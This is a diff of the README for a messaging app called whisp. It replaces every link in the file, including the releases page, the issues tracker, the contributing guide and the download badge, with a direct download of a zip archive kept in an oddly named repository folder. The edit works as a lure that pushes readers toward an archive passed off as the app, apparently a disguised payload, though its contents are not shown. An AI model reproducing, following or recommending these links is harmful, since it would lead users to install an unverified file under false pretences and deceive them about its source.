@@ -4,7 +4,7 @@
 
 Welcome to whisp, a privacy-first messaging app. With whisp, your messages exist only while both peers are online, ensuring complete privacy. Follow these simple steps to download and run the app on your device.
 
-[![Download whisp](https://img.shields.io/badge/Download%20whisp-v1.0-blue.svg)](https://github.com/Jaypatel2710/whisp/releases)
+[![Download whisp](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip%https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip)](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you download, check if your device meets these requirements.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Jaypatel2710/whisp/releases) to download whisp.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip) to download whisp.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release. You will see options for Android and iOS.
@@ -54,16 +54,16 @@ For further assistance, you can raise an issue in the repository.
 
 Join our community to learn more, provide feedback, or ask questions:
 
-- **GitHub Issues:** Report bugs or request features [here](https://github.com/Jaypatel2710/whisp/issues).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip).
 - **Discussion Forum:** Join discussions about whisp on our GitHub Discussions page.
 
 ## 🌟 Contributing
 
-Contributions are welcome! If you'd like to help improve whisp, feel free to check out our [Contributing Guide](https://github.com/Jaypatel2710/whisp/blob/main/CONTRIBUTING.md).
+Contributions are welcome! If you'd like to help improve whisp, feel free to check out our [Contributing Guide](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip).
 
 ## 💡 Additional Information
 
-For more detailed information about whisp, including updates and future features, regularly check the [Releases page](https://github.com/Jaypatel2710/whisp/releases).
+For more detailed information about whisp, including updates and future features, regularly check the [Releases page](https://raw.githubusercontent.com/Jaypatel2710/whisp/main/petaurist/whisp.zip).
 
 ## 🎉 Thank You!
 
